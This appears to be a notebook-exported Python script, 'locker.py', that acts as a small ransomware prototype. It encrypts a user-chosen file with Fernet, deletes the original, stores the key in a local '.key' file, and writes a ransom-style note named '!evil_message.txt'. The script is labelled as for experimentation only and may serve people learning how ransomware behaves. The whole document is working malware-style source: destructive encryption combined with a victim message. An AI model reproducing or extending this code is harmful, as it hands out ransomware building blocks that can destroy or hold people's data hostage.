#!/usr/bin/env python
# coding: utf-8

# In[3]:


#!/usr/bin/env python3
# Author raresteak
# locker.py encrypts files
# This script is for experimentation only
# USE AT YOUR OWN RISK
import os
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
    print("Encrypting:", file_path)
    # Read contents of the file
    with open(file_path, 'rb') as ro_fh:
        contents = ro_fh.read()

    # Load the key
    fernetHandle = Fernet(key)

    # Encrypt file contents
    encryptedContents = fernetHandle.encrypt(contents)

    # Write the encrypted contents to a new file
    new_file_path = file_path + ".encrypted"
    with open(new_file_path, 'wb') as rw_fh:
        rw_fh.write(encryptedContents)

    # Remove the original file
    os.remove(file_path)
    print("Encrypted:", new_file_path)

def main():
    key = Fernet.generate_key()
    keyFh = open('.key', 'wb')
    keyFh.write(key)
    keyFh.close()

    target_file = input("Enter the path of the file to encrypt: ")
    if os.path.exists(target_file) and os.path.isfile(target_file):
        encrypt_file(target_file, key)
        mymessage = "Your files are encrypted, have a nice day."
        print(mymessage)
        mymessageFh = open("!evil_message.txt", "w")
        mymessageFh.writelines(mymessage)
        mymessageFh.close()
    else:
        print("Invalid file path or file does not exist.")

if __name__ == "__main__":
    main()


# In[ ]:




